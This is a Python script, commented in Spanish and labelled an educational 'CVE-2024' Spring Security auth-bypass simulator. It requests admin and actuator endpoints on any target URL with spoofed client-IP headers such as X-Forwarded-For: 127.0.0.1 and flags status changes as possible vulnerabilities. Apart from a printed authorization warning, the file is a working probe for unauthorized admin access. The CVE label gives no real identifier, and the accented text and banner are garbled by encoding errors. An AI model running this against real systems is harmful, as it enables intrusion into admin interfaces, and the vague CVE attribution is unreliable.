
#!/usr/bin/env python3
"""
CVE-2024 Spring Auth Bypass Simulator
Desarrollado por @descambiado para BOFA v2.3.0
EDUCATIVO: Simula bypass de autenticaci√≥n en Spring Security
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin

class SpringAuthBypassSimulator:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        
    def print_banner(self):
        print("""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                CVE-2024 Spring Auth Bypass                      ‚ïë
‚ïë                    HERRAMIENTA EDUCATIVA                         ‚ïë
‚ïë                   Por @descambiado - BOFA                       ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """)
        
    def check_target(self):
        """Verifica si el objetivo es accesible"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            if self.verbose:
                print(f"[INFO] Target {self.target_url} - Status: {response.status_code}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] No se puede conectar al objetivo: {e}")
            return False
            
    def simulate_bypass_attempt(self):
        """Simula intento de bypass de autenticaci√≥n"""
        print("[INFO] Iniciando simulaci√≥n de bypass de autenticaci√≥n...")
        
        # Endpoints t√≠picos a probar
        endpoints = [
            "/admin",
            "/dashboard", 
            "/api/admin",
            "/management",
            "/actuator"
        ]
        
        # Headers de bypass simulados
        bypass_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1", 
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1"
        }
        
        results = []
        
        for endpoint in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            try:
                # Intento normal
                normal_response = self.session.get(url, timeout=5)
                
                # Intento con headers de bypass
                bypass_response = self.session.get(url, headers=bypass_headers, timeout=5)
                
                result = {
                    "endpoint": endpoint,
                    "normal_status": normal_response.status_code,
                    "bypass_status": bypass_response.status_code,
                    "potentially_vulnerable": bypass_response.status_code != normal_response.status_code
                }
                
                results.append(result)
                
                if self.verbose:
                    print(f"[CHECK] {endpoint} - Normal: {normal_response.status_code}, Bypass: {bypass_response.status_code}")
                    
                time.sleep(0.5)  # Rate limiting
                
            except requests.exceptions.RequestException as e:
                if self.verbose:
                    print(f"[ERROR] Error en {endpoint}: {e}")
                    
        return results
        
    def generate_report(self, results):
        """Genera reporte de resultados"""
        print("\n" + "="*60)
        print("REPORTE DE SIMULACI√ìN - CVE-2024 Spring Auth Bypass")
        print("="*60)
        
        vulnerable_count = 0
        
        for result in results:
            status = "üî¥ POSIBLE VULNERABILIDAD" if result["potentially_vulnerable"] else "‚úÖ PROTEGIDO"
            print(f"\nEndpoint: {result['endpoint']}")
            print(f"Status Normal: {result['normal_status']}")
            print(f"Status Bypass: {result['bypass_status']}")
            print(f"Estado: {status}")
            
            if result["potentially_vulnerable"]:
                vulnerable_count += 1
                
        print(f"\nüìä RESUMEN:")
        print(f"Total endpoints probados: {len(results)}")
        print(f"Posibles vulnerabilidades: {vulnerable_count}")
        
        if vulnerable_count > 0:
            print(f"\n‚ö†Ô∏è  RECOMENDACIONES:")
            print("- Actualizar Spring Security a la √∫ltima versi√≥n")
            print("- Revisar configuraci√≥n de headers HTTP")
            print("- Implementar validaci√≥n adicional de origen")
            print("- Auditar logs de acceso")
            
    def run(self):
        """Ejecuta la simulaci√≥n completa"""
        self.print_banner()
        
        print("‚ö†Ô∏è  AVISO: Esta es una herramienta EDUCATIVA")
        print("Solo usar en entornos controlados y con autorizaci√≥n expl√≠cita\n")
        
        if not self.check_target():
            return False
            
        results = self.simulate_bypass_attempt()
        self.generate_report(results)
        
        return True

def main():
    parser = argparse.ArgumentParser(description="CVE-2024 Spring Auth Bypass Simulator")
    parser.add_argument("target", help="URL objetivo (ej: http://localhost:8080)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    
    args = parser.parse_args()
    
    # Validaci√≥n b√°sica de URL
    if not args.target.startswith(('http://', 'https://')):
        print("[ERROR] La URL debe incluir el protocolo (http:// o https://)")
        sys.exit(1)
        
    simulator = SpringAuthBypassSimulator(args.target, args.verbose)
    
    try:
        simulator.run()
    except KeyboardInterrupt:
        print("\n[INFO] Simulaci√≥n interrumpida por el usuario")
    except Exception as e:
        print(f"[ERROR] Error durante la ejecuci√≥n: {e}")

if __name__ == "__main__":
    main()
